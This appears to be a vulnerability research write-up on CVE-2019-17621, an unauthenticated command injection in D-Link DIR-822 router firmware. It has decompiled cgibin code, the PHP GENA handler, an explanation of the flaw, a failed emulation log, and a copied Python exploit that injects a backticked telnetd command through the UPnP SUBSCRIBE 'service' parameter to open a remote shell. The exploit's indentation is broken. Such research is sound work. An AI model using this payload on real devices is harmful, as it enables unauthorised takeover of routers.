
Ref
- https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104
- https://www.freebuf.com/vuls/264695.html

Version
- DIR822A1_FW103WWb03.bin

Download from
- https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DIR-822

# Reverse cgibin


```c

int __cdecl main(int argc, const char **argv, const char **envp)
...

  v28 = strcmp(v4, "gena.cgi");
  v8 = envp;
  if ( !v28 )
  {
    v9 = genacgi_main;
    v10 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v9)(v10, argv, v8);
  }
```


```c
int genacgi_main()
{
  char *v0; // $s0
  char *v1; // $v0
  char *v2; // $v0
  char *v3; // $s1
  char *v4; // $s1

  v0 = getenv("REQUEST_METHOD");
  if ( !v0 )
    return -1;
  v1 = getenv("REQUEST_URI");
  v2 = strchr(v1, 63);          //  find ?
  v3 = v2;
  if ( !v2 || strncmp(v2, "?service=", 9u) )
    return -1;
  v4 = v3 + 9;                  // get str after `service=`
  if ( !strcasecmp(v0, "SUBSCRIBE") )
    return sub_40F5A0(v4);    
  if ( strcasecmp(v0, "UNSUBSCRIBE") )
    return -1;
  else
    return sub_40F970(v4);
}
```


```c
int __fastcall sub_40F5A0(const char *a1)
{
  char *v2; // $s6
  char *v3; // $s3
  char *v4; // $s1
  char *v5; // $s2
  char *v6; // $s4
  char *v7; // $s5
  int v8; // $v0
  int v9; // $a0
  int v10; // $s4
  int v11; // $v0
  char *v12; // $v0
  const char *v13; // $s1
  int v14; // $v0
  char *v15; // $v0
  char *v16; // $s3
  __pid_t v17; // $v0
  __pid_t v18; // $v0
  int v19; // $v0
  int v20; // $v1
  int v21; // $v0
  char v23[516]; // [sp+40h] [-204h] BYREF

  v2 = getenv("SERVER_ID");
  v3 = getenv("HTTP_SID");
  v4 = getenv("HTTP_CALLBACK");
  v5 = getenv("HTTP_TIMEOUT");
  v6 = getenv("HTTP_NT");
  v7 = getenv("REMOTE_ADDR");
  if ( v3 )
  {
    v9 = 400;
    if ( v4 || v6 )
      goto LABEL_19;
    v19 = strcasecmp(v5, "Second-infinite");
    v20 = 0;
    if ( v19 )
    {
      v21 = strncasecmp(v5, "Second-", 7u);
      v9 = 400;
      if ( v21 )
        goto LABEL_19;
      v20 = atoi(v5 + 7);
    }
    snprintf(
      v23,
      0x200u,
      "%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nSID=%s\nTIMEOUT=%d\nSHELL_FILE=%s/%s.sh",
      "/htdocs/upnp/run.NOTIFY.php",
      v2,   
      a1,  //service value
      v3,  //sid
      v20,
      "/var/run",
      a1); 
    xmldbc_ephp(0, 0, v23, stdout);
    return 0;
  }
  v8 = strcmp(v6, "upnp:event");
  v9 = 412;
  if ( v8 || !v4 )
    goto LABEL_19;
  v10 = 0;
  if ( strcasecmp(v5, "Second-infinite") )
  {
    v11 = strncasecmp(v5, "Second-", 7u);
    v9 = 400;
    if ( !v11 )
    {
      v10 = atoi(v5 + 7);
      goto LABEL_7;
    }
LABEL_19:
    cgibin_print_http_status(v9, "", "");
    return 0;
  }
LABEL_7:
  v12 = &v4[strlen(v4) - 1];
  if ( *v12 == 62 )
    *v12 = 0;
  v13 = &v4[*v4 == 0x3C];
  v14 = strncmp(v13, "http://", 7u);
  v9 = 412;
  if ( v14 )
    goto LABEL_19;
  v15 = strchr(v13 + 7, 47);
  v16 = v15;
  if ( !v15 )
  {
    v9 = 412;
    goto LABEL_19;
  }
  *v15 = 0;
  v17 = getpid();
  snprintf(
    v23,
    0x200u,
    "%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh",
    "/htdocs/upnp/run.NOTIFY.php",
    v2,
    a1,
    v13 + 7,
    v16 + 1,
    v10,
    v7,
    "/var/run",
    a1,
    v17);
  xmldbc_ephp(0, 0, v23, stdout);
  fflush(stdout);
  v18 = getpid();
  snprintf(v23, 0x200u, "NOTIFY:0:sh %s/%s_%d.sh", "/var/run", a1, v18);
  xmldbc_timer(0, 0, v23);
  return 0;
}
```


Data pass to run.NOTIFY.php

```php
<?
include "/htdocs/phplib/upnp/xnode.php";
include "/htdocs/upnpinc/gvar.php";
include "/htdocs/upnpinc/gena.php";

$gena_path = XNODE_getpathbytarget($G_GENA_NODEBASE, "inf", "uid", $INF_UID, 1);
$gena_path = $gena_path."/".$SERVICE;
GENA_subscribe_cleanup($gena_path);

/* IGD services */
if ($SERVICE == "L3Forwarding1") $php = "NOTIFY.Layer3Forwarding.1.php";
else if ($SERVICE == "OSInfo1") $php = "NOTIFY.OSInfo.1.php";
else if ($SERVICE == "WANCommonIFC1") $php = "NOTIFY.WANCommonInterfaceConfig.1.php";
else if ($SERVICE == "WANEthLinkC1") $php = "NOTIFY.WANEthernetLinkConfig.1.php";
else if ($SERVICE == "WANIPConn1") $php = "NOTIFY.WANIPConnection.1.php";
/* WFA services */
else if ($SERVICE == "WFAWLANConfig1") $php = "NOTIFY.WFAWLANConfig.1.php";
if ($METHOD == "SUBSCRIBE")
{
	if ($SID == "")  // first time will be empty
		GENA_subscribe_new($gena_path, $HOST, $REMOTE, $URI, $TIMEOUT, $SHELL_FILE, "/htdocs/upnp/".$php, $INF_UID);
	else
		GENA_subscribe_sid($gena_path, $SID, $TIMEOUT);
}
else if ($METHOD == "UNSUBSCRIBE")
{
	GENA_unsubscribe($gena_path, $SID);
}

?>
```


```php
function GENA_subscribe_new($node_base, $host, $remote, $uri, $timeout, $shell_file, $target_php, $inf_uid)
{
	anchor($node_base);
	$count = query("subscription#");
	$found = 0;
	/* find subscription index & uuid */
	foreach ("subscription")
	{
		if (query("host")==$host && query("uri")==$uri) {$found = $InDeX; break;}
	}
	if ($found == 0)
	{
		$index = $count + 1;
		$new_uuid = "uuid:".query("/runtime/genuuid");
	}
	else
	{
		$index = $found;
		$new_uuid = query("subscription:".$index."/uuid");
	}
	
	/* get timeout */
	if ($timeout==0 || $timeout=="") {$timeout = 0; $new_timeout = 0;}
	else {$new_timeout = query("/runtime/device/uptime") + $timeout;}
	/* set to nodes */
	set("subscription:".$index."/remote", $remote);
	set("subscription:".$index."/uuid", $new_uuid);
	set("subscription:".$index."/host", $host);
	set("subscription:".$index."/uri", $uri);
	set("subscription:".$index."/timeout", $new_timeout);
	set("subscription:".$index."/seq", "1");
	GENA_subscribe_http_resp($new_uuid, $timeout);
	GENA_notify_init($shell_file, $target_php, $inf_uid, $host, $uri, $new_uuid);

}
```


```php
function GENA_notify_init($shell_file, $target_php, $inf_uid, $host, $uri, $sid)
{
	$inf_path = XNODE_getpathbytarget("", "inf", "uid", $inf_uid, 0);
	if ($inf_path=="")
	{
		TRACE_debug("can't find inf_path by $inf_uid=".$inf_uid."!");
		return "";
	}
$phyinf = PHYINF_getifname(query($inf_path."/phyinf"));
if ($phyinf == "")
	{
		TRACE_debug("can't get phyinf by $inf_uid=".$inf_uid."!");
		return "";
	}

$upnpmsg = query("/runtime/upnpmsg");
if ($upnpmsg == "") $upnpmsg = "/dev/null";
fwrite(w, $shell_file,
	"#!/bin/sh\n".
	'echo "[$0] ..." > '.$upnpmsg."\n".
	"xmldbc -P ".$target_php.
	" -V INF_UID=".$inf_uid.
	" -V HDR_URL=".SECURITY_prevent_shell_inject($uri).
	" -V HDR_HOST=".SECURITY_prevent_shell_inject($host).
	" -V HDR_SID=".SECURITY_prevent_shell_inject($sid).
	" -V HDR_SEQ=0".
	" | httpc -i ".$phyinf." -d ".SECURITY_prevent_shell_inject($host)." -p TCP > ".$upnpmsg."\n"
);
fwrite(a, $shell_file, "rm -f ".$shell_file."\n");  //here will cause rce
}
```


Cause `shell_file` in cgibin is  service value ,and in `GENA_notify_init` will write `$shell_file` in shell script. Can cause RCE


```python
import socket
import os
from time import sleep
# Exploit By Miguel Mendez & Pablo Pollanco
def httpSUB(server, port, shell_file):
	print('\n[*] Connection {host}:{port}').format(host=server, port=port)
	con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
	request += "Host: " + str(server) + str(port) + "\n"
	request += "Callback: <http://192.168.0.4:34033/ServiceProxy27>\n"
	request += "NT: upnp:event\n"
	request += "Timeout: Second-1800\n"
	request += "Accept-Encoding: gzip, deflate\n"
	request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
sleep(1)
print('[*] Sending Payload')
con.connect((socket.gethostbyname(server),port))
con.send(request.encode())
results = con.recv(4096)
sleep(1)
print('[*] Running Telnetd Service')
sleep(1)
print('[*] Opening Telnet Connection\n')
sleep(2)
os.system('telnet ' + str(server) + ' 9999')
serverInput = raw_input('IP Router: ')
portInput = 49152
httpSUB(serverInput, portInput, '`telnetd -p 9999 &`')
```

# Emulate

Fail
```bash
user@vm-ubuntu20:~/firmware-analysis-plus$ python3 fap.py -q ./qemu-builds/2.5.0/ testcases/iot_dir880l_110b01.bin 

             
            ______   _                ___                 
            |  ___| (_)              / _ \                
            | |_     _   _ __ ___   / /_\ \  _ __    ___  
            |  _|   | | | '_ ` _ \  |  _  | | '_ \  / __| ++
            | |     | | | | | | | | | | | | | | | | \__ \ 
            \_|     |_| |_| |_| |_| \_| |_/ |_| |_| |___/

            Welcome to the Firmware Analysis Plus - v2.3.1
 By lys - https://github.com/liyansong2018/firmware-analysis-plus
    
[+] Firmware: iot_dir880l_110b01.bin
[+] Extracting the firmware...
[+] Image ID: 1
[+] Identifying architecture...
[+] Architecture: armel
[+] Building QEMU disk image...
Traceback (most recent call last):
  File "/home/user/firmware-analysis-plus/fap.py", line 210, in <module>
    main()
  File "/home/user/firmware-analysis-plus/fap.py", line 204, in main
    make_image(arch, image_id)
  File "/home/user/firmware-analysis-plus/fap.py", line 112, in make_image
    child.expect_exact(pexpect.EOF)
  File "/usr/lib/python3/dist-packages/pexpect/spawnbase.py", line 421, in expect_exact
    return exp.expect_loop(timeout)
  File "/usr/lib/python3/dist-packages/pexpect/expect.py", line 181, in expect_loop
    return self.timeout(e)
  File "/usr/lib/python3/dist-packages/pexpect/expect.py", line 144, in timeout
    raise exc
pexpect.exceptions.TIMEOUT: Timeout exceeded.
<pexpect.pty_spawn.spawn object at 0x7fefe7c62ce0>
command: /usr/bin/sudo
args: ['/usr/bin/sudo', '--', '/home/user/firmware-analysis-plus/firmadyne/scripts/makeImage.sh', '1', 'armel']
buffer (last 100 chars): b'[sudo] password for user: \r\nSorry, try again.\r\n[sudo] password for user: '
before (last 100 chars): b'[sudo] password for user: \r\nSorry, try again.\r\n[sudo] password for user: '
after: <class 'pexpect.exceptions.TIMEOUT'>
match: None
match_index: None
exitstatus: None
flag_eof: False
pid: 120896
child_fd: 5
closed: False
timeout: 30
delimiter: <class 'pexpect.exceptions.EOF'>
logfile: None
logfile_read: None
logfile_send: None
maxread: 2000
ignorecase: False
searchwindowsize: None
delaybeforesend: 0.05
delayafterclose: 0.1
delayafterterminate: 0.1
searcher: searcher_string:
    0: EOF
```